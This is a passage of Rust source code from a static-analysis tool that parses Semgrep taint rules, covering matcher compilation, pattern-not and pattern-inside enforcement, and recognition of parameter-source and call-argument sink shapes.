            Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
        };
    if sources.is_empty() {
        return TaintRuleParse::Skip(format!(
            "taint rule `{}` has no valid `pattern-sources`",
            id
        ));
    }

    let (sinks, sink_neg_strings, sink_inside_strings) =
        match compile_matcher_list(yaml.get("pattern-sinks"), MatcherRole::Sink, &id, lang) {
            Ok(v) => v,
            Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
        };
    if sinks.is_empty() {
        return TaintRuleParse::Skip(format!("taint rule `{}` has no valid `pattern-sinks`", id));
    }

    let (sanitizers, _sanitizer_neg_strings, _sanitizer_inside_strings) = match compile_matcher_list(
        yaml.get("pattern-sanitizers"),
        MatcherRole::Sanitizer,
        &id,
        lang,
    ) {
        Ok(v) => v,
        Err(e) => return TaintRuleParse::Skip(format!("taint rule `{}` skipped: {}", id, e)),
    };

    // ── Compile captured `pattern-not` constraints into AST patterns ──
    //
    // Each string was lifted out of a `patterns:` AND-block by
    // `compile_patterns_block`. We compile them through the same SEARCH-mode
    // path used for positive `pattern-not` matchers so negative evaluation
    // agrees with Semgrep's grammar/metavariable handling. A pattern that
    // fails to parse is warned-and-skipped (we do not abort the rule: the
    // positive matchers still stand, we just can't enforce that one
    // exclusion — same posture as other deferred constraints).
    let sink_negatives = compile_negative_patterns(&sink_neg_strings, lang, &id, "pattern-sinks");
    let source_negatives =
        compile_negative_patterns(&source_neg_strings, lang, &id, "pattern-sources");
    if !source_neg_strings.is_empty() {
        eprintln!(
            "Warning: taint rule `{}` has `pattern-not` constraints inside \
             `pattern-sources`; these are compiled but source-side enforcement \
             is not yet applied (findings carry no source byte range) — \
             documented limitation",
            id
        );
    }

    // ── Compile captured `pattern-inside` constraints into AST patterns ──
    //
    // Same SEARCH-mode compilation path as positive `pattern-inside` in
    // search rules (see `semgrep_compat.rs`). Sink-side insides are enforced
    // by the post-filter: a finding is kept only when its sink is contained
    // by one of these regions. A pattern that fails to parse is
    // warned-and-skipped (the rule still stands; the containment is just not
    // enforced — matcher stays broader).
    let sink_insides = compile_inside_patterns(&sink_inside_strings, lang, &id, "pattern-sinks");
    let source_insides =
        compile_inside_patterns(&source_inside_strings, lang, &id, "pattern-sources");
    if !source_inside_strings.is_empty() {
        eprintln!(
            "Warning: taint rule `{}` has `pattern-inside` constraints inside a \
             `pattern-sources` `patterns:` block; these are compiled but source-side \
             enforcement is not yet applied (findings carry no source byte range) — \
             documented limitation",
            id
        );
    }

    TaintRuleParse::Compiled(SemgrepTaintRule {
        id: format!("semgrep/{}", id),
        message,
        severity,
        cwe,
        lang,
        spec: GenericSpec {
            sources,
            sinks,
            sanitizers,
        },
        negatives: TaintNegatives {
            sink: sink_negatives,
            source: source_negatives,
        },
        insides: TaintInsides {
            sink: sink_insides,
            source: source_insides,
        },
    })
}

/// Compile a list of raw `pattern-not` pattern strings (lifted from a
/// `patterns:` AND-block of the given role) into SEARCH-mode AST patterns,
/// warning-and-skipping any that do not parse into a usable pattern node.
fn compile_negative_patterns(
    patterns: &[String],
    lang: Language,
    rule_id: &str,
    role_label: &str,
) -> Vec<crate::rules::semgrep_compat::CompiledAstPattern> {
    let mut out = Vec::new();
    for p in patterns {
        match crate::rules::semgrep_compat::CompiledAstPattern::try_new(p, lang) {
            Some(compiled) => out.push(compiled),
            None => eprintln!(
                "Warning: taint rule `{}` {} `pattern-not: {}` did not parse into \
                 a usable pattern; ignoring constraint (matcher stays broader)",
                rule_id, role_label, p
            ),
        }
    }
    out
}

/// Compile a list of raw `pattern-inside` pattern strings (lifted from a
/// `patterns:` AND-block of the given role) into SEARCH-mode AST patterns,
/// warning-and-skipping any that do not parse into a usable pattern node.
/// Compiled through the same path as `pattern-not` and positive search-mode
/// `pattern-inside` so grammar/metavariable handling agrees across modes.
fn compile_inside_patterns(
    patterns: &[String],
    lang: Language,
    rule_id: &str,
    role_label: &str,
) -> Vec<crate::rules::semgrep_compat::CompiledAstPattern> {
    let mut out = Vec::new();
    for p in patterns {
        match crate::rules::semgrep_compat::CompiledAstPattern::try_new(p, lang) {
            Some(compiled) => out.push(compiled),
            None => eprintln!(
                "Warning: taint rule `{}` {} `pattern-inside: {}` did not parse into \
                 a usable pattern; ignoring constraint (matcher stays broader)",
                rule_id, role_label, p
            ),
        }
    }
    out
}

#[derive(Copy, Clone)]
enum MatcherRole {
    Source,
    Sink,
    Sanitizer,
}

impl MatcherRole {
    fn label(self) -> &'static str {
        match self {
            MatcherRole::Source => "pattern-sources",
            MatcherRole::Sink => "pattern-sinks",
            MatcherRole::Sanitizer => "pattern-sanitizers",
        }
    }
}

/// Compile a top-level `pattern-sources` / `pattern-sinks` /
/// `pattern-sanitizers` list.
///
/// Each entry is allowed to be either:
///
/// - a mapping with a single `pattern:` key (compiled to one [`NodeMatcher`]),
/// - a mapping with a single `pattern-either:` key whose value is itself a
///   list of entries following the same rules (flattened recursively into
///   multiple matchers).
///
/// Any other key (`patterns:`, `pattern-inside:`, `metavariable-pattern:`,
/// …) is rejected with a warning that names the rule and the offending key,
/// and the individual entry is skipped. If the role ends up with *no* valid
/// entries the caller decides whether that is fatal for the whole rule
/// (sources and sinks are required; sanitizers may legitimately be empty).
///
/// Returns the compiled matchers and, separately, the raw `pattern-not` and
/// `pattern-inside` pattern strings lifted out of any `patterns:` AND-blocks
/// in this list (keyed by `role` so the caller knows where to enforce them).
/// The constraints are compiled to AST patterns later by the caller —
/// collecting them here keeps `compile_entry` / `compile_patterns_block`
/// focused on the expressible-matcher side.
fn compile_matcher_list(
    node: Option<&YamlValue>,
    role: MatcherRole,
    rule_id: &str,
    lang: Language,
) -> Result<(Vec<GenericMatcher>, Vec<String>, Vec<String>), String> {
    let Some(node) = node else {
        return Ok((Vec::new(), Vec::new(), Vec::new()));
    };
    let Some(entries) = node.as_sequence() else {
        return Err(format!("{} must be a list", role.label()));
    };

    let mut out = Vec::new();
    let mut negatives: Vec<String> = Vec::new();
    let mut insides: Vec<String> = Vec::new();
    for entry in entries {
        compile_entry(
            entry,
            role,
            rule_id,
            lang,
            &mut out,
            &mut negatives,
            &mut insides,
        );
    }
    Ok((out, negatives, insides))
}

/// Compile a single entry from a source/sink/sanitizer list, flattening
/// nested `pattern-either:` blocks, and extracting expressible matchers from
/// `patterns:` AND-blocks. Invalid entries emit a warning and are skipped
/// rather than aborting the whole rule.
///
/// `negatives` accumulates the raw `pattern-not` pattern strings and
/// `insides` the raw `pattern-inside` pattern strings lifted from `patterns:`
/// AND-blocks so the caller can compile and enforce them; every other
/// constraint key is still dropped with a warning.
fn compile_entry(
    entry: &YamlValue,
    role: MatcherRole,
    rule_id: &str,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
    negatives: &mut Vec<String>,
    insides: &mut Vec<String>,
) {
    let Some(map) = entry.as_mapping() else {
        eprintln!(
            "Warning: taint rule `{}` {} entry is not a mapping; skipping",
            rule_id,
            role.label()
        );
        return;
    };

    // `by-side-effect:` is a Semgrep taint-source flag (the *side-effect* of the
    // matched expression is the source, not its value). The compiled matcher
    // shape is the same either way, so we treat the flag as a no-op marker and
    // compile the companion `pattern:`/`patterns:`/`pattern-either:` key. Drop
    // the flag from the key count so an entry like
    // `{ by-side-effect: true, pattern: ... }` is not mis-rejected as multi-key.
    let effective_keys: Vec<(&YamlValue, &YamlValue)> = map
        .iter()
        .filter(|(k, _)| k.as_str() != Some("by-side-effect"))
        .collect();

    // Entries are expected to carry exactly one top-level key (after dropping
    // the `by-side-effect` flag). Having more than one suggests the user meant
    // `patterns:` semantics, which we don't support inside taint blocks — warn
    // and skip.
    if effective_keys.len() != 1 {
        eprintln!(
            "Warning: taint rule `{}` {} entry has {} keys (expected a single `pattern:`, `pattern-either:`, or `patterns:`); skipping entry",
            rule_id,
            role.label(),
            effective_keys.len(),
        );
        return;
    }

    let (k, v) = effective_keys[0];
    match k.as_str() {
        Some("pattern") => {
            let Some(pattern) = v.as_str() else {
                eprintln!(
                    "Warning: taint rule `{}` {} `pattern:` value must be a string; skipping entry",
                    rule_id,
                    role.label()
                );
                return;
            };
            match compile_pattern(pattern, role, lang) {
                Some(m) => out.push(m),
                None => eprintln!(
                    "Warning: taint rule `{}` {} unsupported pattern shape `{}`; skipping entry",
                    rule_id,
                    role.label(),
                    pattern
                ),
            }
        }
        Some("pattern-either") => {
            let Some(inner) = v.as_sequence() else {
                eprintln!(
                    "Warning: taint rule `{}` {} `pattern-either:` must be a list; skipping",
                    rule_id,
                    role.label()
                );
                return;
            };
            if inner.is_empty() {
                eprintln!(
                    "Warning: taint rule `{}` {} `pattern-either:` is empty; producing no matchers",
                    rule_id,
                    role.label()
                );
                return;
            }
            for nested in inner {
                compile_entry(nested, role, rule_id, lang, out, negatives, insides);
            }
        }
        Some("patterns") => {
            // ── Parameter-as-source shape (focus-metavariable + a function-
            //    signature `pattern-inside`/`pattern`) ─────────────────────
            //
            // The dominant rejected taint-source shape is "a parameter of the
            // enclosing handler/function is user-controlled", written as
            //
            //   patterns:
            //     - pattern-inside: |
            //         function ... (..., $ARG, ...) { ... }
            //     - focus-metavariable: $ARG
            //
            // or the AWS-Lambda variant `pattern: $EVENT` + a
            // `pattern-either:` of `pattern-inside` handler signatures binding
            // `$EVENT` as a parameter. None of the generic node shapes express
            // this, so the block compiles to nothing and the rule is rejected.
            //
            // When the block is the parameter-as-source shape we compile it to
            // a single any-parameter wildcard source
            // (`ParamName { names: [ANY_PARAM_WILDCARD] }`); each engine seeds
            // every function parameter as tainted (see
            // `taint_engine::param_names_are_wildcard`). Only meaningful as a
            // SOURCE — a parameter is a taint origin, not a destination.
            if let MatcherRole::Source = role {
                if try_compile_param_source_block(v, out) {
                    return;
                }
            }
            // ── Focus-on-call-argument SINK shape (the sink-side analog of the
            //    parameter-as-source shape) ──────────────────
            //
            // A common rejected sink shape names a focused metavariable that is
            // an ARGUMENT of a call given by a `pattern-inside`/`pattern`
            // context, e.g.
            //
            //   patterns:
            //     - pattern-inside: redirect_to $X, ...
            //     - pattern: $X
            //
            //   patterns:
            //     - pattern: $RES.$METH($QUERY, ...)
            //     - metavariable-regex: { metavariable: $METH, regex: ^(sendFile)$ }
            //     - focus-metavariable: $QUERY
            //
            // Semgrep means "the focused argument, when it appears inside this
            // call, is a sink". The dropped-constraint fallback empties the sink
            // role (no bare metavar is a usable sink), rejecting the rule. We
            // compile the call context to the existing `Call`/`MethodName` sink
            // matcher (which already fires only when a tainted value reaches the
            // call's arguments), gated by the method-name `metavariable-regex`
            // where present. Sink/sanitizer only — a call argument is a data-flow
            // destination, not a taint origin.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_focus_call_sink_block(v, role, lang, out) {
                    return;
                }
            }
            // ── Regex-bounded bare-metavar callee SINK shape ────────────────
            //
            // A `patterns:` AND-block that pairs a bare-metavariable callee
            // pattern with a `metavariable-regex` pinning that metavariable,
            // e.g.
            //
            //   patterns:
            //     - pattern: $EXEC(...)
            //     - metavariable-regex: { metavariable: $EXEC, regex: ^(system|exec)$ }
            //
            //   patterns:
            //     - pattern: $WRITER.$WRITE(...)
            //     - metavariable-regex: { metavariable: $WRITE, regex: ^(writerow)$ }
            //
            // Without the `metavariable-regex` a bare-metavar callee would
            // match every call (universal → FP) and is refused. WITH the pin
            // the match is bounded to callees whose name matches the regex, so
            // we compile a name-constrained `CallRegex`/`MethodNameRegex`
            // matcher that enforces the regex at match time. Sink/sanitizer
            // only — a call argument is a data-flow destination, not an origin.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_regex_constrained_callee_block(v, role, rule_id, out) {
                    return;
                }
            }
            // ── Regex-bounded metavariable-RECEIVER SINK shape ──────────────
            //
            // The receiver-side analogue of the regex-bounded callee shape: a
            // `patterns:` AND-block that pairs a metavariable-receiver call with
            // a CONCRETE method (`$OBJ.method(...)`) and a `metavariable-regex`
            // whose anchored alternation pins the *receiver* metavariable, e.g.
            //
            //   patterns:
            //     - pattern: $CONN.execute(...)
            //     - metavariable-regex: { metavariable: $CONN, regex: ^(db|conn)$ }
            //
            // Without the pin, `$OBJ.method(...)` compiles (via the normal
            // pattern path) to a receiver-agnostic `MethodName { method }` sink
            // that fires on EVERY `*.method(...)` call, and the receiver
            // `metavariable-regex` is dropped — a documented broadening / FP.
            // WITH an anchored-alternation pin we enumerate one concrete
            // `Call { canonical: "<recv>.method" }` per listed receiver, so only
            // calls whose receiver is a named identifier fire. Sink/sanitizer
            // only — a call argument is a destination, not an origin.
            if let MatcherRole::Sink | MatcherRole::Sanitizer = role {
                if try_compile_regex_constrained_receiver_block(v, role, out) {
                    return;
                }
            }
            // `patterns:` is a Semgrep AND-block: all sub-items must hold
            // simultaneously. foxguard's taint engine cannot express all AND
            // semantics (no nested scope / contextual constraints), so we
            // apply a graceful-degradation strategy:
            //
            // - Extract every `pattern:` and `pattern-either:` sub-item and
            //   compile them as expressible node-shape matchers.
            // - Capture `pattern-not:` sub-items into the `negatives`
            //   accumulator and `pattern-inside:` sub-items into the
            //   `insides` accumulator so the post-filter can ENFORCE them
            //   against the matched sink node (previously dropped, which
            //   broadened the matcher and caused false positives —
            //   pattern-inside made the rule fire everywhere instead of only
            //   inside the required region).
            // - Drop the remaining constraint-only sub-items
            //   (`pattern-not-inside:`, `focus-metavariable:`,
            //   `metavariable-*:`) with a per-key warning. This makes the
            //   compiled matcher slightly BROADER than the original Semgrep
            //   rule — documented in COMPATIBILITY.md — but only for those
            //   deferred keys.
            // - If no expressible matcher results, warn-skip the whole entry.
            compile_patterns_block(v, role, rule_id, lang, out, negatives, insides);
        }
        Some(other) => {
            eprintln!(
                "Warning: taint rule `{}` {} uses unsupported key `{}` (only `pattern:`, `pattern-either:`, and `patterns:` are supported); skipping entry",
                rule_id,
                role.label(),
                other
            );
        }
        None => {
            eprintln!(
                "Warning: taint rule `{}` {} entry has a non-string key; skipping",
                rule_id,
                role.label()
            );
        }
    }
}

/// The set of sub-item keys inside a `patterns:` block that are purely
/// constraint/narrowing operators — they refine the match scope but do not
/// themselves name a code node shape. The taint engine has no equivalent for
/// these (yet); they are dropped with a warning, making the compiled matcher
/// broader. `pattern-not` and `pattern-inside` are intentionally ABSENT from
/// this list: they are captured into the negatives/insides accumulators and
/// ENFORCED by the post-filter (containment precision), instead of dropped.
const PATTERNS_CONSTRAINT_KEYS: &[&str] = &[
    "pattern-not-inside",
    "pattern-not-regex",
    "focus-metavariable",
    "metavariable-regex",
    "metavariable-comparison",
    "metavariable-pattern",
    "metavariable-analysis",
    "metavariable-type",
];

/// Compile a `patterns:` AND-block value (the list under the `patterns:` key)
/// by extracting all expressible `pattern:` and `pattern-either:` sub-items.
/// `pattern-not:` sub-items are captured into `negatives` and `pattern-inside:`
/// sub-items into `insides` (both compiled and enforced later by the
/// post-filter). The remaining constraint-only sub-items are dropped with a
/// warning. If no expressible matcher is produced the whole entry is
/// warn-skipped.
fn compile_patterns_block(
    v: &YamlValue,
    role: MatcherRole,
    rule_id: &str,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
    negatives: &mut Vec<String>,
    insides: &mut Vec<String>,
) {
    let Some(inner) = v.as_sequence() else {
        eprintln!(
            "Warning: taint rule `{}` {} `patterns:` value must be a list; skipping entry",
            rule_id,
            role.label()
        );
        return;
    };

    if inner.is_empty() {
        eprintln!(
            "Warning: taint rule `{}` {} `patterns:` block is empty; skipping entry",
            rule_id,
            role.label()
        );
        return;
    }

    let before = out.len();

    for sub in inner {
        let Some(sub_map) = sub.as_mapping() else {
            continue;
        };
        if sub_map.len() != 1 {
            continue;
        }
        let (sk, sv) = sub_map.iter().next().expect("len == 1");
        match sk.as_str() {
            Some("pattern") | Some("pattern-either") => {
                // Recursively compile via the normal entry path.
                compile_entry(sub, role, rule_id, lang, out, negatives, insides);
            }
            Some("pattern-inside") => {
                // Capture the containment context. It is compiled to a
                // SEARCH-mode AST pattern by the caller and enforced against
                // the matched sink node in the post-filter: a finding is kept
                // only when its sink is textually inside a region matched by
                // this pattern, instead of being dropped (which broadened the
                // matcher — the rule fired everywhere rather than only inside
                // the required region).
                match sv.as_str() {
                    Some(p) if !p.trim().is_empty() => insides.push(p.to_string()),
                    _ => eprintln!(
                        "Warning: taint rule `{}` {} `patterns:` block has a \
                         `pattern-inside:` whose value is not a non-empty string; \
                         ignoring constraint",
                        rule_id,
                        role.label()
                    ),
                }
            }
            Some("pattern-not") => {
                // Phase 2: capture the negative pattern string. It is
                // compiled to a SEARCH-mode AST pattern by the caller and
                // enforced against the matched source/sink node in the
                // post-filter, instead of being dropped (which broadened
                // the matcher and produced false positives).
                match sv.as_str() {
                    Some(p) if !p.trim().is_empty() => negatives.push(p.to_string()),
                    _ => eprintln!(
                        "Warning: taint rule `{}` {} `patterns:` block has a \
                         `pattern-not:` whose value is not a non-empty string; \
                         ignoring constraint",
                        rule_id,
                        role.label()
                    ),
                }
            }
            Some(constraint_key) if PATTERNS_CONSTRAINT_KEYS.contains(&constraint_key) => {
                // Constraint-only key — drop with a warning (documented broadening).
                eprintln!(
                    "Warning: taint rule `{}` {} `patterns:` block contains `{}` \
                     which foxguard cannot enforce inside a taint source/sink entry; \
                     dropping constraint (matcher will be broader than the original rule)",
                    rule_id,
                    role.label(),
                    constraint_key
                );
                let _ = sv; // sv is not used beyond the warning
            }
            Some(other) => {
                eprintln!(
                    "Warning: taint rule `{}` {} `patterns:` block contains unknown key `{}`; \
                     skipping sub-item",
                    rule_id,
                    role.label(),
                    other
                );
            }
            None => {}
        }
    }

    if out.len() == before {
        eprintln!(
            "Warning: taint rule `{}` {} `patterns:` block produced no expressible matchers; \
             skipping entry",
            rule_id,
            role.label()
        );
    }
}

/// Try to recognise the "parameter-as-source" shape in a `patterns:` source
/// block and, if found, push a single any-parameter wildcard source matcher.
///
/// Returns `true` (and pushes one matcher) when the block both:
///   1. names a seed metavariable `$X` — either as a `focus-metavariable: $X`
///      sub-item, or as a bare `pattern: $X` sub-item; and
///   2. contains a function-signature context (a `pattern:` or
///      `pattern-inside:` whose text declares a function/method whose
///      *parameter list* contains that same `$X`).
///
/// Discipline: we require the seed metavariable to appear *inside a parameter
/// list* of a function-definition pattern in the SAME block, so we never seed
/// "all parameters" off an unrelated metavariable. The compiled source is the
/// [`ANY_PARAM_WILDCARD`] sentinel — engines seed every function parameter as
/// tainted, matching Semgrep's any-parameter semantics for this shape.
///
/// Returns `false` (and pushes nothing) for any other block shape, leaving the
/// caller to fall through to the normal graceful-degradation extraction.
fn try_compile_param_source_block(v: &YamlValue, out: &mut Vec<GenericMatcher>) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    // Collect, across the whole block (recursing into pattern-either), the set
    // of focus/bare-pattern seed metavariables and the set of function-signature
    // pattern texts.
    let mut seeds: Vec<String> = Vec::new();
    let mut signature_texts: Vec<String> = Vec::new();
    collect_param_source_parts(items, &mut seeds, &mut signature_texts);

    if seeds.is_empty() || signature_texts.is_empty() {
        return false;
    }

    // The seed metavariable must appear as a parameter of at least one
    // function-signature context in the block.
    let matched = seeds.iter().any(|seed| {
        signature_texts
            .iter()
            .any(|sig| signature_has_param(sig, seed))
    });
    if !matched {
        return false;
    }

    out.push(GenericMatcher::ParamName {
        names: vec![crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()],
        description: "untrusted function parameter".to_string(),
    });
    true
}

/// Walk a `patterns:` block (and nested `pattern-either:` lists) collecting
/// seed metavariables (`focus-metavariable: $X` and bare `pattern: $X`) and the
/// text of function-signature contexts (`pattern:` / `pattern-inside:` whose
/// value is a multi-line function definition).
fn collect_param_source_parts(
    items: &[YamlValue],
    seeds: &mut Vec<String>,
    signature_texts: &mut Vec<String>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else if is_function_definition_pattern(t) {
                            signature_texts.push(t.to_string());
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        if is_function_definition_pattern(s) {
                            signature_texts.push(s.to_string());
                        }
                    }
                }
                Some("pattern-either") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_param_source_parts(seq, seeds, signature_texts);
                    }
                }
                Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_param_source_parts(seq, seeds, signature_texts);
                    }
                }
                _ => {}
            }
        }
    }
}

/// True when `pat` looks like a function/method definition pattern: it declares
/// a function with a parameter list. We accept the common cross-language
/// keywords plus the assignment-to-function form (`exports.handler = function
/// (...)`, `$F = function (...)`), requiring a `(` ... `)` parameter list.
fn is_function_definition_pattern(pat: &str) -> bool {
    let p = pat.trim();
    if !(p.contains('(') && p.contains(')')) {
        return false;
    }
    // A leading definition keyword anywhere in the (possibly multi-line) pattern.
    p.contains("function")                       // JS/TS/PHP
        || p.contains("func ")                   // Go
        || p.starts_with("def ")
        || p.contains("\ndef ")                  // Python/Ruby/Scala
        || p.contains("fun ")                    // Kotlin
        || p.contains("=>")                      // arrow / lambda
        // A Java/C-style typed method signature: `$T $M(...) { ... }` — a
        // metavariable or identifier return type followed by a name and a
        // parameter list and a brace body.
        || (p.contains('{') && p.contains('$'))
}

/// True when the function-signature pattern `sig` lists `seed` (a metavariable
/// like `$ARG`) inside its FIRST parameter list `( ... )`. This bounds the
/// any-parameter seed to a metavariable that is genuinely a parameter, so we
/// never seed off an unrelated metavariable elsewhere in the pattern.
fn signature_has_param(sig: &str, seed: &str) -> bool {
    let Some(open) = sig.find('(') else {
        return false;
    };
    // Find the matching close paren for this first '(' (balanced).
    let bytes = sig.as_bytes();
    let mut depth = 0i32;
    let mut close = None;
    for (i, &b) in bytes.iter().enumerate().skip(open) {
        match b {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    close = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let Some(close) = close else {
        return false;
    };
    let params = &sig[open + 1..close];
    // Token-boundary match so `$ARG` does not match `$ARGUMENT`.
    params
        .split(|c: char| !is_ident_char(c) && c != '$')
        .any(|tok| tok == seed)
}

/// Try to recognise the "focus-on-call-argument" SINK shape in a `patterns:`
/// sink/sanitizer block and, if found, push the call's `Call`/`MethodName`
/// matcher(s). Returns `true` (and pushes ≥1 matcher) on recognition.
///
/// Recognition is the sink-side analog of [`try_compile_param_source_block`]:
///   1. the block names a focused metavariable `$F` — via `focus-metavariable:
///      $F` or a bare `pattern: $F`; and
///   2. the block carries a CALL context (a `pattern:` or `pattern-inside:`
///      whose text is a call) whose ARGUMENT LIST contains that `$F` (literally,
///      or via a `...`/metavariable wildcard arg list — "an argument of the
///      call").
///
/// The call's callee is compiled to a sink matcher:
///   - a concrete callee (`redirect_to(...)`, `render(...)`) → one `Call`;
///   - a `$RECV.$METH(...)` callee whose `$METH` is pinned by an anchored
///     alternation `metavariable-regex` (`^(sendfile|sendFile)$`) → one
///     `MethodName` per listed method name;
///   - a `$FUNC(...)` pure-metavariable callee whose `$FUNC` is pinned by an
///     anchored-alternation `metavariable-regex` → one `Call` per listed name.
///
/// These reuse the existing `Call`/`MethodName` sink machinery, which only
/// fires when a tracked-tainted value reaches the call's arguments — so the
/// compiled sink is gated on taint AND the concrete callee/method name, keeping
/// it from being an over-broad bare-node sink. Any callee that does not resolve
/// to a concrete name (no regex pin, metavariable left free) produces nothing,
/// so the caller falls through to the normal graceful-degradation extraction.
fn try_compile_focus_call_sink_block(
    v: &YamlValue,
    role: MatcherRole,
    lang: Language,
    out: &mut Vec<GenericMatcher>,
) -> bool {
    let Some(items) = v.as_sequence() else {
        return false;
    };

    let mut seeds: Vec<String> = Vec::new();
    let mut call_texts: Vec<String> = Vec::new();
    let mut metavar_regexes: Vec<(String, String)> = Vec::new();
    collect_focus_call_sink_parts(items, &mut seeds, &mut call_texts, &mut metavar_regexes);

    if seeds.is_empty() || call_texts.is_empty() {
        return false;
    }

    let before = out.len();
    for call in &call_texts {
        // The focused metavariable must be an argument of this call.
        if !seeds.iter().any(|seed| call_has_arg(call, seed)) {
            continue;
        }
        compile_focus_call_callee(call, role, lang, &metavar_regexes, out);
    }
    out.len() > before
}

/// Walk a sink `patterns:` block (recursing into `pattern-either:`/`patterns:`)
/// collecting focused metavariables (`focus-metavariable: $F` and bare
/// `pattern: $F`), call-context texts (`pattern:`/`pattern-inside:` whose value
/// is a call expression), and `metavariable-regex` (metavariable, regex) pairs.
fn collect_focus_call_sink_parts(
    items: &[YamlValue],
    seeds: &mut Vec<String>,
    call_texts: &mut Vec<String>,
    metavar_regexes: &mut Vec<(String, String)>,
) {
    for item in items {
        let Some(map) = item.as_mapping() else {
            continue;
        };
        for (k, val) in map {
            match k.as_str() {
                Some("focus-metavariable") => {
                    if let Some(s) = val.as_str() {
                        let mv = s.trim();
                        if is_metavariable(mv) {
                            seeds.push(mv.to_string());
                        }
                    }
                }
                Some("pattern") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_metavariable(t) {
                            seeds.push(t.to_string());
                        } else if is_call_context_pattern(t) {
                            call_texts.push(t.to_string());
                        }
                    }
                }
                Some("pattern-inside") => {
                    if let Some(s) = val.as_str() {
                        let t = s.trim();
                        if is_call_context_pattern(t) {
                            call_texts.push(t.to_string());
                        }
                    }
                }
                Some("metavariable-regex") => {
                    if let Some(m) = val.as_mapping() {
                        let mv = m
                            .get(YamlValue::from("metavariable"))
                            .and_then(YamlValue::as_str);
                        let re = m.get(YamlValue::from("regex")).and_then(YamlValue::as_str);
                        if let (Some(mv), Some(re)) = (mv, re) {
                            metavar_regexes.push((mv.to_string(), re.to_string()));
                        }
                    }
                }
                Some("pattern-either") | Some("patterns") => {
                    if let Some(seq) = val.as_sequence() {
                        collect_focus_call_sink_parts(seq, seeds, call_texts, metavar_regexes);
                    }
                }
                _ => {}
            }
        }
    }
}

/// True when `pat` looks like a (single) call expression: a callee followed by
/// a balanced `(...)` argument list, with the call ending the pattern (allowing
/// a trailing statement `;` / `,...` Semgrep ellipsis already inside the parens).
/// Rejects assignments, binops, blocks, and multi-line definitions.
fn is_call_context_pattern(pat: &str) -> bool {
    let p = pat.trim().trim_end_matches(';').trim();
    // A single logical line (no nested blocks / function bodies).
    if p.contains('\n') || p.contains('{') {
        return false;
    }
    // Must be a call: a `(` opening an argument list that closes at end.
    let Some(open) = p.find('(') else {
        return false;
    };
    if !p.ends_with(')') {
        return false;
    }
    let callee = p[..open].trim();
    if callee.is_empty() {
        return false;
    }
    // The callee must not itself contain call/operator punctuation that would
    // make this an expression rather than a plain `callee(args)` form. A dotted
    // / metavariable chain is fine.
    !callee.contains('(')
        && !callee.contains('=')
        && !callee.contains('+')
        && !callee.contains('%')
        && !callee.contains('[')
}

/// True when the call pattern `call` lists `seed` (a metavariable like `$ARG`)
/// inside its argument list, OR has a wildcard/metavariable argument list
/// (`(...)`, `($X)`) — i.e. the focused metavariable is one of the call's
/// arguments. Bounds the sink to a focus that is genuinely a call argument.
fn call_has_arg(call: &str, seed: &str) -> bool {
    let c = call.trim().trim_end_matches(';').trim();
    let Some(open) = c.find('(') else {
        return false;
    };
    let bytes = c.as_bytes();
    let mut depth = 0i32;
    let mut close = None;
    for (i, &b) in bytes.iter().enumerate().skip(open) {
        match b {
            b'(' => depth += 1,
            b')' => {
                depth -= 1;
                if depth == 0 {
                    close = Some(i);
                    break;
                }
            }
            _ => {}
        }
    }
    let Some(close) = close else {
        return false;
    };
    let args = c[open + 1..close].trim();
    // Literal argument match (token boundary so `$ARG` != `$ARGUMENT`).
    let literal = args
        .split(|ch: char| !is_ident_char(ch) && ch != '$')
        .any(|tok| tok == seed);
    if literal {
        return true;
    }
    // A wildcard argument list (`...` / a bare metavariable) carries the focus.
    args == "..." || args.is_empty() || is_metavariable(args)
}

/// Compile the callee of a recognised focus-call sink to `Call`/`MethodName`
/// matcher(s), pinning a metavariable callee/method with its anchored-alternation
/// `metavariable-regex` where present.
fn compile_focus_call_callee(
    call: &str,
    role: MatcherRole,
    lang: Language,
    metavar_regexes: &[(String, String)],
    out: &mut Vec<GenericMatcher>,
) {
    let c = call.trim().trim_end_matches(';').trim();
    let Some(open) = c.find('(') else {
        return;
    };
    let callee = c[..open].trim();

    // Case 1: `$RECV.$METH(...)` — metavariable receiver + metavariable method.
    // Pin `$METH` via its regex → one `MethodName` per alternative.
    if let Some(dot) = callee.find('.') {
        let recv = &callee[..dot];
        let meth = &callee[dot + 1..];
        if is_metavariable(recv) && is_metavariable(meth) && !meth.contains('.') {
            if let Some(names) = regex_alternatives_for(meth, metavar_regexes) {
                for name in names {
                    out.push(GenericMatcher::MethodName {
                        method: name.clone(),
                        description: describe(&name, role),
                    });
                }
            }
            return;
        }
        // `$RECV.method(...)` — concrete method on a metavariable receiver.
        if is_metavariable(recv) && is_identifier(meth) {
            out.push(GenericMatcher::MethodName {
                method: meth.to_string(),
                description: describe(meth, role),
            });
            return;
        }
    }

    // Case 2: `$FUNC(...)` — pure-metavariable callee. Pin via its regex → one
    // `Call` per alternative.
    if is_metavariable(callee) {
        if let Some(names) = regex_alternatives_for(callee, metavar_regexes) {
            for name in names {
                out.push(GenericMatcher::Call {
                    canonical: name.clone(),
                    description: describe(&name, role),
                });
            }
        }
        return;
    }

    // Case 3: concrete callee (`redirect_to`, `render`, `a.b.method`). Reuse the
    // normal pattern compiler on the call text so it lands in the right shape.
    if let Some(m) = compile_pattern(c, role, lang) {
        if matches!(
            m,
